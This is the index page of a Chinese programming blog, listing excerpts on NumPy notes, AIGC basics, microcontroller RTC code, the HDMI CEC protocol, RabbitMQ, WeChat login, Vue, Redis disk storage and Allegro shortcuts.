<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程中国的博客">
		<meta property="og:title" content="编程中国的博客" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddae443edc11dbd377b55dfa2e8c07c2/" rel="bookmark">
			Python学习笔记合集(Numpy总结)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python学习笔记合集 Python学习笔记合集(Numpy总结)Python学习笔记第二十七天(NumPy 安装)Python学习笔记第二十八天(NumPy Ndarray 对象)Python学习笔记第二十九天(N维数组（ndarray）)Python学习笔记第三十天(NumPy 数据类型)Python学习笔记第三十一天(NumPy 数组属性)Python学习笔记第三十二天(NumPy 创建数组)Python学习笔记第三十三天(NumPy 从已有的数组创建数组)Python学习笔记第三十四天(NumPy 从数值范围创建数组)Python学习笔记第三十五天(NumPy 切片和索引)Python学习笔记第三十六天(NumPy 高级索引)Python学习笔记第三十七天(NumPy 广播(Broadcast))Python学习笔记第三十八天(NumPy 迭代数组)Python学习笔记第三十九天(Numpy 数组操作(上))Python学习笔记第四十天(Numpy 数组操作(下))Python学习笔记第四十一天(NumPy 位运算)Python学习笔记第四十二天(NumPy 字符串函数)Python学习笔记第四十三天(NumPy 数学函数)Python学习笔记第四十四天(NumPy 算术函数)Python学习笔记第四十五天(NumPy 统计函数)Python学习笔记第四十六天(NumPy 排序、条件刷选函数)Python学习笔记第四十七天(NumPy 字节交换)Python学习笔记第四十八天(NumPy 副本和视图)Python学习笔记第四十九天(NumPy 矩阵库(Matrix))Python学习笔记第五十天(NumPy 线性代数)Python学习笔记第五十一天(NumPy IO) 相关资料： Python学习笔记合集(Numpy总结) 点击蓝色字体跳转详情页面
Python学习笔记第二十七天(NumPy 安装) NumPy 安装
NumPy 安装使用已有的发行版本使用 pip 安装Linux 下安装安装验证 Python学习笔记第二十八天(NumPy Ndarray 对象) NumPy Ndarray 对象
NumPy Ndarray对象 ndarray 的内部结构 Python学习笔记第二十九天(N维数组（ndarray）) N维数组（ndarray）
N维数组ndarray的内部内存布局Array方法算术，矩阵乘法和比较运算 Python学习笔记第三十天(NumPy 数据类型) NumPy 数据类型
NumPy 数据类型数据类型对象 (dtype) Python学习笔记第三十一天(NumPy 数组属性) NumPy 数组属性
NumPy 数组属性ndarray.ndimndarray.shapendarray.itemsizendarray.flags Python学习笔记第三十二天(NumPy 创建数组) NumPy 创建数组
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddae443edc11dbd377b55dfa2e8c07c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f89d80204b71c764e22ffb0002ed35c3/" rel="bookmark">
			AIGC是什么？一文读懂人工智能生成内容技术！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 前言一、AIGC是什么？二、AIGC的4个主要特征1、文本生成2、图像生成3、语音生成4、视频生成 三、AIGC如何运作？步骤1：收集数据步骤2：模型训练步骤3：内容生成步骤4：反馈和改进 四、AIGC关键技术能力五、应用领域六、AIGC的优势和挑战 前言 随着人工智能技术的不断发展，我们进入了一个信息爆炸的时代，信息量庞大，但也难免产生了信息过载的问题。为了解决这一问题，人工智能生成内容技术（AIGC）应运而生。
生成式人工智能AIGC（Artificial Intelligence Generated Content）是人工智能1.0时代进入2.0时代的重要标志。
一、AIGC是什么？ AIGC是一种新的人工智能技术，它的全称是Artificial Intelligence Generative Content，即人工智能生成内容。
它是一种基于机器学习和自然语言处理的技术，能够自动产生文本、图像、音频等多种类型的内容。这些内容可以是新闻文章、小说、图片、音乐，甚至可以是软件代码。AIGC系统通过分析大量的数据和文本，学会了模仿人类的创造力，生成高质量的内容。
二、AIGC的4个主要特征 现阶段国内AIGC多以单模型应用的形式出现，主要分为文本生成、图像生成、视频生成、音频生成，其中文本生成成为其他内容生成的基础。
1、文本生成 文本生成（AI Text Generation），人工智能文本生成是使用人工智能(AI)算法和模型来生成模仿人类书写内容的文本。它涉及在现有文本的大型数据集上训练机器学习模型，以生成在风格、语气和内容上与输入数据相似的新文本。
2、图像生成 图像生成（AI Image Generation），人工智能(AI)可用于生成非人类艺术家作品的图像。这种类型的图像被称为“人工智能生成的图像”。人工智能图像可以是现实的或抽象的，也可以传达特定的主题或信息。
这里区别于搜索（搜索是别人传上来，检索图片，这里是咒语生成，即使相同咒语生成的也不一样，是独一无二的）
3、语音生成 语音生成（AI Audio Generation），AIGC的音频生成技术可以分为两类，分别是文本到语音合成和语音克隆。文本到语音合成需要输入文本并输出特定说话者的语音，主要用于机器人和语音播报任务。到目前为止，文本转语音任务已经相对成熟，语音质量已达到自然标准，未来将向更具情感的语音合成和小样本语音学习方向发展；语音克隆以给定的目标语音作为输入，然后将输入语音或文本转换为目标说话人的语音。此类任务用于智能配音等类似场景，合成特定说话人的语音。
4、视频生成 视频生成（AI Video Generation），AIGC已被用于视频剪辑处理以生成预告片和宣传视频。工作流程类似于图像生成，视频的每一帧都在帧级别进行处理，然后利用 AI 算法检测视频片段。AIGC生成引人入胜且高效的宣传视频的能力是通过结合不同的AI算法实现的。凭借其先进的功能和日益普及，AIGC可能会继续革新视频内容的创建和营销方式。
三、AIGC如何运作？ 通过单个大规模数据的学习训练，令AI具备了多个不同领域的知识，只需要对模型进行适当的调整修正，就能完成真实场景的任务。AIGC的工作原理可以分为以下几个步骤：
步骤1：收集数据 AIGC 需要大量的数据来学习和理解人类创作的内容。这些数据可以包括书籍、文章、图片、音频和视频等各种形式的媒体。
步骤2：模型训练 基于收集的数据，AIGC利用深度学习模型进行训练。这些模型通常是神经网络，它们通过学习文本、图像或音频的模式和语法规则来生成新内容。
步骤3：内容生成 一旦模型训练好，它就可以开始生成内容。用户可以输入一些基本的信息或要求，然后AIGC会根据这些信息生成相应的内容。这可以是新闻文章、小说、音乐、绘画等各种类型的作品。
步骤4：反馈和改进 AIGC通常会用户的反馈，用于改进接收的内容。这有助于模型不断学习并提高生成质量。
四、AIGC关键技术能力 实现AIGC更加智能化、实用化的三大要素是：数据、算力、算法。
数据：AIGC人有我优的核心基础，包括存储（集中式数据库、分布式数据库、云原生数据库、向量数据库）、来源（用户数据、公开域数据、私有域数据）、形态（结构化数据、非结构化数据）、处理（筛选、标注、处理、增强…）
算力:为AIGC提供基础算力的平台，包括半导体（CPU、GPU、DPU、TPU、NPU）、服务器、大模型算力集群、基于IaaS搭建分布式训练环境、自建数据中心部署。
算法:通过模型设计、模型训练、模型推理、模型部署步骤，完成从机器学习平台、模型训练平台到自动建模平台的构建，实现对实际业务的支撑与覆盖。
五、应用领域 AIGC在各个领域都有广泛的应用，下面我们来看一些主要领域：
内容创作:AIGC可以用于生成新闻文章、博客帖子、小说等文本内容。它可以根据用户的需求，生成高质量、独特的文本，为内容创作者提供了巨大的帮助。
广告和营销:AIGC能够生成引人注目的广告标语、宣传材料和社交媒体内容，帮助企业吸引更多的客户。
教育:在教育领域，AIGC可以生成个性化的教育内容，帮助学生更好地理解和掌握知识。
医疗:AIGC可以帮助医疗专业人士分析患者数据并生成医疗报告，提高医疗诊断的准确性。
艺术与创意:AIGC可以生成音乐、绘画、甚至电影剧本，为创意艺术家提供了无限的灵感来源。
六、AIGC的优势和挑战 优势:
效率：AIGC可以大幅提高内容生成的速度，节省时间和资源。一致性：生成的内容通常保持一致，避免出现错误。个性化：AIGC可以根据用户需求生成定制内容。大规模生产：AIGC可以轻松应对大规模的内容生成需求。 挑战:
质量问题：虽然AIGC的生成质量不断提高，但仍然存在错误和不准确的问题。伦理问题：AIGC可能被用于虚假信息传播、伪造文档等不道德行为。人类替代方案：自动化内容生成可能导致人类工作岗位减少，引发社会问题。隐私问题：AIGC使用大量数据，引发隐私和数据安全问题。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4316f584ab70ca566ac516709112e9b6/" rel="bookmark">
			单片机设计_RTC时钟（ACM32F403）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、电路设计 ACM32F403开发板
实现结果：通过串口发送每秒的时间
二、运行结果 三、部分代码 #include "APP.h" UART_HandleTypeDef Uart_Handle; /********************************************************************************* * Function : Uart_Init * Description : Uart Initialization **********************************************************************************/ void Uart_Init(uint32_t fu32_Baudrate) { Uart_Handle.Instance = UART1; Uart_Handle.Init.BaudRate = fu32_Baudrate; Uart_Handle.Init.WordLength = UART_WORDLENGTH_8B; Uart_Handle.Init.StopBits = UART_STOPBITS_1; Uart_Handle.Init.Parity = UART_PARITY_NONE; Uart_Handle.Init.Mode = UART_MODE_TX_RX_DEBUG; Uart_Handle.Init.HwFlowCtl = UART_HWCONTROL_NONE; HAL_UART_Init(&amp;Uart_Handle); printf("MCU is running, HCLK=%dHz, PCLK=%dHz\n", System_Get_SystemClock(), System_Get_APBClock()); } /********************************************************************************* * Function : main * Description : The application entry point. * Input : None * Output : None **********************************************************************************/ int main(void) { System_Init(); Uart_Init(115200); /* Function：RTC_TIME_DATE_SET_GET、 RTC_ALARM、 RTC_TAMPER、 RTC_STANDBY_RTC_WAKEUP、 */ APP_RTC_Test(RTC_TIME_DATE_SET_GET); while(1) { } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc1c79f3033dcd72373b6a77e93bd864/" rel="bookmark">
			HDMI ——CEC 协议详解以及待机唤醒 实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文讲解的是基于HDMI CEC的待机唤醒方案的设计。
目录
cec基本介绍
CEC协议时序：
CEC数据帧
cec待机唤醒介绍
待机唤醒的处理流程和实现
cec基本介绍 如今常见的高清视频接口有HDMI,VGA,DP和DVI。HDMI（High-Definition Multimedia Interface）为当今主流的多媒体高速数字接口，下图为最常见的线缆引脚分布图。其中，CEC（Consumer Electronics Control）信号通过13引脚传输，作为HDMI接口的一部分。CEC总线作为控制信号被分离出来，使得在不增加数据占用宽带的情况下完成高速复杂的通信要求。
CEC 是一套完整的单总线协议，电子设备可以借助CEC信号让使用可控制HDMI接口上所连接的装置，比如单独播放，系统待机，可以实现由单一遥控器控制所有HDMI连接的装置。最多15个设备，允许HDMI设备在没有用户干扰情况下互相命令控制。
CEC 是与其他HDMI信号分开的电信号。这允许设备在睡眠模式下禁止其高速电路，但是可以被CEC唤醒。他是一个单独的共享总线，直接连接在设备上的所有HDMI端口间，可以流过所有完全断电的设备。
总线是开路集电极线，有点像IIC，被动上拉至3.3V，设备拉低进行数据传输。
与IIC相似之处：低速串行总线；采用无源上拉的集电极开路；速度受分布电容影响；接收器可以将发送的1位转换为0：发送1比特并观察是否转换为0以查看是否丢失；面向字节都附加一个应答位；特殊的启动信息
与IIC不同之处：单线并不是两根线；以固定时序发送比特；低速串行总线（417bit/s）；四个地址位；定义了动态地址分配协议；标头包括发起者和收件人地址；没有特殊停止信号，每个字节附加一个消息结束标志；没有读操作，通过获取请求获取响应帧，所有数据均从数据发送；每个设备都必须能够作为主设备传输数据；地址后字节数据有详细规定说明。
CEC协议时序： bit Timing
每个位从线拉低（下降沿）开始，保持时间表示位值，之后拉高，直至后续位开始
正常数据位长为2.40.35ms。保持低电平0.6±0.2ms为逻辑1；保持低电平1.5±0.2ms表示逻辑0。接收器在下降沿后1.05±0.2ms对线路进行采样，然后在下降沿1.9±0.15ms开始观察下一位。
接收者可以将传输的传输的1bt转换为0通过在下降沿后0.35s拉低总线并保持直到表示逻辑0的电平时间。这个通常用于确认传输。
每个帧都有起始位，通过拉低总线3.7±0.2ms,然后允许上升，总持续时间为4.5±0.2ms。在观察总线空闲之后，任何设备都可以发送起始位。（通常5位时间，但成功后立即传输7位时间，以促进总线的公平共享，以及传输失败和重传之间的3位时间。)
对于单接收消息，应答位类似于C:以1位发送，接收器将其下拉至0以确认该位字节。（根据下面给出的波形可以看出，ack位的波形为逻辑1，但是为什么逻辑分析仪解析的值为0呢？是因为接收器将其下拉至0 以确认该位字节）
对于广播消息，应答位被反转：仍然作为1位发送，但被拒绝该字节的任何接收器下拉到0位。每个CEC帧的第一个字节包含4位源和目标地址头。如果寻址目标存在，则它确认该字节。由除标题之外的任何内容组成的帧是pig,它只检查另个设备的存在。
地址15（1111B)用于广播地址（作为目的地）和未注册的设备（作为源），它们尚未选择不同的地址。一些设备不需要接收非广播的消息，因此可以永久使用地址15。需要接收寻址消息的设备需要自己的地址。设备通过pig它获取地址，如果ping未被确认，则设备声明它。如果确认ping,则设备尝试另个地址。
第二个字节是操作码，它指定要执行的操作，以及后续数据字节的数量及含义。
CEC数据帧 cec帧结构 = 起始位+引导块+数据块
Start（bit）+ Header Block + Data Block 1(opcode block) + Data Block 2 (operand blocks)
注：
Block定义：Data(8 bit) + EOM(1 bit) + ACK(1 bit)
Header Block定义：Initiator(4 bit) + Destination(4 bit) + EOM(1 bit) + ACK(1 bit)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc1c79f3033dcd72373b6a77e93bd864/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dae7bb124d086bef52d50d63d48fa423/" rel="bookmark">
			Java中配置RabbitMQ基本步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中配置RabbitMQ，需要遵循以下步骤：
1.添加依赖
在项目的pom.xml文件中添加RabbitMQ的Java客户端依赖：
&lt;dependency&gt; &lt;groupId&gt;com.rabbitmq&lt;/groupId&gt; &lt;artifactId&gt;amqp-client&lt;/artifactId&gt; &lt;version&gt;5.13.0&lt;/version&gt; &lt;/dependency&gt; 2.创建连接工厂
创建一个连接工厂，用于创建与RabbitMQ服务器的连接：
import com.rabbitmq.client.ConnectionFactory; public class RabbitMQConfig { public static ConnectionFactory createConnectionFactory() { ConnectionFactory factory = new ConnectionFactory(); factory.setHost("localhost"); // 设置RabbitMQ服务器地址 factory.setPort(5672); // 设置RabbitMQ服务器端口 factory.setUsername("guest"); // 设置用户名 factory.setPassword("guest"); // 设置密码 return factory; } } 3.创建生产者和消费者 创建一个生产者，用于发送消息到RabbitMQ队列：
import com.rabbitmq.client.Channel; import com.rabbitmq.client.Connection; import com.rabbitmq.client.ConnectionFactory; public class Producer { public static void main(String[] args) throws Exception { ConnectionFactory factory = RabbitMQConfig.createConnectionFactory(); Connection connection = factory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dae7bb124d086bef52d50d63d48fa423/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1485e5b8e8a8a90704527de11175e710/" rel="bookmark">
			【微信小程序开发】之微信授权登陆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
​编辑一、微信授权登陆介绍
1. 基本概念
2. 微信小程序开发实现微信授权登陆原理流程
3. 小程序中运用微信授权登陆的好处
二、微信授权登陆接口演示
1. 在微信开发工具中导入小程序授权微信登陆前端项目
2. 微信授权登陆的方式
2.1 wx.login
2.2 wx.getUserProfile
2.3 二者的区别
三、 小程序微信授权登陆流程
1. 流程图
2. 代码调试
2.1 导入调试后端代码
2.2 导入调试前端代码
2.3 效果演示
3. 代码
小程序前端代码
login.wxml
login.js
后端代码
IpUtil.java
WxAuthController.java
WxHomeController.java
WxInfoController.java
WxUserController.java
四、解决微信名称含特殊标签符号的存储问题
1. 配置my.ini文件
2. 重启我们的数据库服务
3. 点击多账号调试
前言 在上一期的博客中与大家分享了微信小程序开发会议OA项目首页数据的后台交互，以及在其中使用到工具文件来实现便捷的去调用请求访问后台的接口方法，还涉及了.wxs文件的介绍和使用。今天给大家带来的是微信小程序开发之微信授权登陆，让我们一起来了解了解吧。
一、微信授权登陆介绍 1. 基本概念 微信授权登录是指用户通过微信账号登录第三方应用或网站的一种身份验证方式。当用户在第三方应用或网站上选择使用微信登录时，该应用或网站会跳转到微信登录页面，用户在此页面输入微信账号和密码进行登录。一旦用户成功登录并授权，第三方应用或网站就能够获得用户在微信上的基本信息，如昵称、头像等，并用于用户在应用或网站上的个性化服务。这种授权登录的方式方便用户快速登录第三方平台，同时减少了用户填写注册信息的麻烦。
2. 微信小程序开发实现微信授权登陆原理流程 实现微信授权登录的主要原理流程如下：
在小程序中创建一个“登录”按钮或其他触发授权登录的交互元素。
用户点击登录按钮后，小程序调用wx.login接口获取临时登录凭证code。
小程序调用wx.getUserInfo接口获取用户的基本信息，例如昵称、头像等。
小程序将获取到的临时登录凭证code和用户基本信息发送给开发者自己的后台服务器。
开发者的后台服务器收到请求后，通过code调用微信的登录凭证校验接口，验证凭证的有效性，并获取到openid和session_key。
开发者的后台服务器根据获取的openid和session_key生成一个自定义的用户标识 token，并返回给小程序。
小程序将自定义的用户标识 token 存储起来，作为用户登录的凭证。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1485e5b8e8a8a90704527de11175e710/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6866a326af980030af099a04e84f26bc/" rel="bookmark">
			【coderwhy前端笔记 - 阶段六 VUE 】(整理版)（更新中2023.7.16）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		coderwhy前端系统课 - 阶段六VUE (整理版)（更新中2023.10.23） 1. 前言 本文以coderwhy前端系统课 - 阶段六VUE为主。
一刷版本的笔记有些乱，目前还在二刷整理，同时参考了一部分其他的资料，并加上个人使用总结
暂时停更，在备考，考完分享《软考中级-软件评测师》的复习资源和笔记
-----2023-10-23
建议使用 资源绑定 或 链接 里的html文件进行阅读
直接下载
资源说明：
资源内有自定义的样式更便于阅读，这里的样式不做额外编写资源内点击侧边栏开关时文章阅读位置会偏移，点击目录定位即可资源内的图片无法像csdn的可以点击放大，但能看清的该文章有些定位点链接，资源内可点击，文章这点了没效果，不做额外修改该文章出现一些看不懂的符号拼接啥的，略过
（一些自定义语法，太多了，这回应该删完了，后面更新估计懒得删） ----2023.10.23 更新----
图片经停1秒会放大显示
（会有文章抖动现象，vscode的md目前没有像csdn的可以点击放大图片） 附上一张效果图：
2. vue2 vs vue3 放在开头为了方便对比，后面的内容以vue3为主
2.1. vue文件结构 /.wrap2 &lt;
/.box &lt;
vue2
&lt;template&gt; &lt;div&gt; &lt;h1&gt;{{ title }}&lt;/h1&gt; &lt;button @click="increment"&gt;{{ count }}&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { title: 'Hello, Vue2!', count: 0 } }, methods: { increment() { this.count++ } } } &lt;/script&gt; /-&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6866a326af980030af099a04e84f26bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/591cf2ce559697e97a6abb722c65f9c2/" rel="bookmark">
			无敌了！Redis进军磁盘存储！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在高手林立的数据库江湖，Redis就像一个刺客，或许不如经典数据库存在感强，但因其高性能的特质而在群英榜中独占一席。
作为缓存的首选内存数据库，Redis最近放出了一个大新闻——将磁盘作为分层存储体系结构的一部分，以降低成本并扩大系统的吸引力。
关键在于，Redis 本身是一个内存数据库，这意味着其数据存储在RAM中而不是磁盘上。与传统的基于磁盘的数据库相比，这提供了更快的读写吞吐量和更低的延迟。某种意义上说，Redis的成功正是在于这种“打破常规”。
但如今，Redis又将磁盘纳入其存储体系中，不禁让人猜测：Redis到底意欲何为？自废武功还是在下一盘大棋？
1、对抗价格优势：纳入磁盘，降低成本？ 早期由于内存价格昂贵等原因，内存数据库发展较慢。随着内存技术逐渐成熟，内存成本下降，同时容量稳步扩大，内存数据库和传统数据库混合使用正成为趋势。Redis就是内存数据库中的佼佼者。
在2023年Stack Overflow调查中，Redis被评为专业开发人员中最受欢迎的数据库第六位，最受欢迎的NoSQL数据库第二位。通过Redis能够创建缓存以防止主数据库过载，因此大约23%的专业开发者使用该系统。
可以说，Redis当前已成为蓝星上最受欢迎的数据库之一。不过Redis并不满足于此。
其首席执行官Rowan Trollope在接受外媒采访时表示，亚毫秒级分布式系统为开发人员提供了所需的性能，但必须承认的是，为互联网规模构建的其他系统（如MongoDB）可能更具有价格优势。
为了解决这个问题，该公司已经创建了一种分层的内存方法，在其内存系统后提供闪存支持。
“我们在磁盘和内存之间只隔了半步。对于某些特定的用例，例如在游戏中，公司可能会让我们提供他们需要的实时积分排行榜和其他游戏内统计数据。”
然而，在游戏发行的初期热潮之后，大量用户将完成游戏，他们的账户也会随之进入休眠状态，直到新章节或新内容发布时，他们才可能重返游戏。Trollope说，使用闪存可以让用户对内存进行动态地分级。
“我们可以将一段时间内未被接触的较少使用的数据转移到闪存中，在那里存放一段时间。当用户最终回来的时候，我们很容易将其从闪存无缝地移回内存中。”
Redis现在计划将这个概念扩展到基于磁盘的内存，以提供对三层架构的支持。Trollope指出，希望此举将帮助客户降低成本并简化其架构。
2、Redis的野心：无敌是多么寂寞，所以我们要开新地图 在Trollope看来，Redis的流行在很大程度上要归功于缺乏竞争。“我们并没有真正与其他公司竞争。”
当然这一说法有待商榷。至少同为高性能NoSQL数据库的Aerospike也是风头正劲。Aerospike的客户包括索尼娱乐、PayPal和Airtel。
今年8月，Aerospike 宣布推出图数据库 Aerospike Graph。Aerospike Graph 以极高的吞吐量跨数十亿个顶点和数万亿个连接提供毫秒多跳图查询。基准测试显示，在一小部分基础设施上，每秒的吞吐量超过100000次查询，延迟低于5毫秒。
遗憾的是，Aerospike虽然来势汹汹，但还欠火候。在Stack Overflow的榜单中，它没有进入专业开发人员使用的前30个数据库之列。另外，数据库业界最权威的排名榜单DB-Engines将Aerospike排在第65位，而Redis排在第6位。
同时，Trollope坚持，要从更宏观的层面去看，Redis在一条“与众不同”的赛道上，在这条赛道上，Redis可以说是“一家独大”。
“我想说的是，细数世界上最流行的数据库，我们是领先的内存数据库，没有其他人能做到这一点。Mongo不这么做。也没有云厂商这样做，比如微软Azure Cosmos DB，或Oracle，或Amazon DynamoDB：他们不是内存数据库。我们与所有其他排名前十的数据库一起使用，但我们并没有真正与它们竞争。”
（Stack Overflow 2023 开发者调查报告数据库TOP10）
当在某一领域进入“无敌”状态，要想更进一步，那就唯有开启新地图了。
Redis就是这样做的。作为缓存数据库Redis的成功毋庸置疑，但Redis一直在努力扩大其作为通用数据库的吸引力。
去年11月，Redis 收购了 RESP.app，后者是一个易于使用的 GUI，用于访问Redis数据库并执行基本的批量操作，从而简化开发人员的日常工作。
另外，对Redis的一个主要批评是它缺乏对SQL的支持。Trollope表示，现在已经解决了。RediSQL模块在GitHub上是可用的。
在他看来，这是推动Redis“更像你的经典数据库”的一部分。在未来，将添加对自然语言查询的支持以及增强的向量和特征存储功能。
图穷匕见，Redis的种种行动昭示了其雄心：成为一个出色的配角还不够，必须要提升其作为主咖的角色份额。
3、开发者异议：他们正在偏离我们选择Redis的初衷 对于Redis的CEO发出的“推动Redis‘更像经典数据库’”的表态，开发者中有人表示了理解，认为这可能是顺应市场需求的选择。
“数据‘存储’之间的界限正在变得模糊。我以前见过x团队需要一个快速的键值存储，所以显而易见的选择是Redis。一年过去了，产品在不断发展，开发者想要做一些‘经典’的查询。也许在Redis中保留它是有意义的，因为它支持你需要的查询，而不是迁移/复制到整个其他系统。”
但更多人的第一反应是：这似乎偏离了人们使用Redis的初衷。
至今被引为美谈的Redis的诞生，正是由于Redis之父Salvatore Sanfilippo对数据库“缺乏经验”，这才使他敢于打破“良好”数据库工程的各种神圣规则，从而创建Redis。而很多开发人员最初被Redis吸引，选择使用Redis，也正是因为它不像所谓“经典数据库”。
还有人对目前Redis的发展走向表示了强烈反对，他主张“Redis的一大优点是它没有SQL数据库的开销”。
“我使用Redis和MySQL一起构建web应用程序。当你需要在服务器端存储临时或任意数据时，Redis非常出色，没有MySQL之类的开销。对于我们来说，我们在应用程序中为用户创建Redis键，然后将序列化的数据写入该键。让数据进出这个结构都非常简单，更不用说速度了。通常都是不需要持久化的数据，不过我相信如果有必要的话也可以写入磁盘。我不想编写SQL样式的查询来读取或写入这样的数据。对于我所描述的数据类型，我绝对不希望也不需要MySQL提供的事务或任何‘安全’特性。”
这位开发者强调：“Redis目前的形式很好，有很多不同的用例。没有绝对正确或错误的使用方法，除了它绝对不能替代像MySQL这样的东西。因为不同的工具适用于不同的工作。”
4、结语：性能为王，但绝不甘于只做一个高性能的缓存数据库 Redis最引以为傲的，可能就是其开辟了一条有别于传统数据库的新路，并成功在竞争堪称惨烈的数据库赛道上存活并壮大了起来。“高性能”的特质迄今为止仍是其标志和支柱。
性能为王并非口号，而且随着时间的推移只会越发严格。你永远不会听到一个老板说，“我希望我们的数据库慢一点”。如何让数据库易开发、低延时、可扩展且面向未来才是更重要的。
不过就像Redis在其官方博文中提到的：Redis 是一个很好的缓存数据库，但扩展Redis作为主数据库的角色，从而让开发人员在构建应用程序时领先一步，才是其未来发展的愿景。到底结果如何，我们且观后效。
5、最后，推荐一款应用开发工具 JNPF开发平台，很多人都用过它，它是功能的集大成者，任何信息化系统都可以基于它开发出来。
原理是将开发过程中某些重复出现的场景、流程，具象化成一个个组件、api、数据库接口，避免了重复造轮子。因而极大的提高了程序员的生产效率。
官网：http://www.jnpfsoft.com/?csdn，如果你有闲暇时间，可以做个知识拓展。
这是一个基于Java Boot/.Net Core构建的简单、跨平台快速开发框架。前后端封装了上千个常用类，方便扩展；集成了代码生成器，支持前后端业务代码生成，满足快速开发，提升工作效率；框架集成了表单、报表、图表、大屏等各种常用的Demo方便直接使用；后端框架支持Vue2、Vue3。
为了支撑更高技术要求的应用开发，从数据库建模、Web API构建到页面设计，与传统软件开发几乎没有差异，只是通过低代码可视化模式，减少了构建“增删改查”功能的重复劳动。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4464793dd2cd8b1148f53fd4d0cf5327/" rel="bookmark">
			Vue3获取proxy对象的值而不是引用的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 情景 vue3中定义一个响应式对象：
let obj1 = reactive({userName:"tom", age:5, hobby:{a:"av",b:"bv"}}); 打印obj1，结果为proxy对象
定义第二个响应式对象：
let obj2 = reactive({ userName:"", age:"", hobby:{} }) 将对象obj1赋值给对象obj2
obj2 = obj1 赋值没问题 但是！当我们修改两个对象中的一个，那么另一个对象会和被修改的对象同步。
例如：当我们修改obj2的 age为8后，那么obj1的值也会变为8。
这是因为当我们执行obj2 = obj1时，我们赋值给obj2的并不是obj1的内容，而是obj1的内存引用。
解决 目的：获取proxy对象的值
方式一：扩展运算符
obj2 = {...obj1} 方式二：Object.assign()
obj2 = Object.assign({}, obj1); 获取深层对象值
obj2.hobby = {...obj1.hobby} or obj2.hobby = Object.assign({}, obj1.hobby); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f1ce398f3ed79cc62e234e03792abdf/" rel="bookmark">
			allegro设置快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		allegro设置快捷键 一、快捷键设置二、env文件在哪里？三、加入自己设置的快捷方式F1 is normally reserved by the system for Help so we don't use it修改快捷键设置完成后打开allergo软件，就可以看见自己设置的快捷键了。 ![在这里插入图片描述](https://img-blog.csdnimg.cn/156c0062afe740e78e0e4cf0c0d4def3.png#pic_center) 自定义快捷键 原文链接：https://blog.csdn.net/LVNENGBING/article/details/108800425
可以26个字母+数字组合（x，y，i，这3个字母不得用，因为xy是坐标，i是偏移，软件本身已占用）
alias 命令不能用来定义字母，原因是字母键要用来输入命令行。但是funckey 命令 可以用来定义单个字母为快捷键，它比alias 命令更为强大，alias 能定义的它都能定义,但是字母 被定义成某快捷键后，该字母就不能用来输入键盘命令了。
funckey 命令定义的快捷键，字符是区分大小写的，比如：
funckey M “iangle 90” #元件旋转90°
funckey m move #移动元件
alias Del Delete（激活删除命令）
PS："~“表示"Ctrl键”；
可以一个快捷键执行多个命令，用引号引起来即可。例如以下命令表示输入ct则执行布线，class设置为etch，subclass设置为Top三个分命令。
funckey ct “add connect; class Etch ; subclass Top”
标准的写法是双引号。但是貌似单引号也行。如果双引号作用于单个命令，实际上用 alias 查看可以发现和不使用引号的效果是一样。
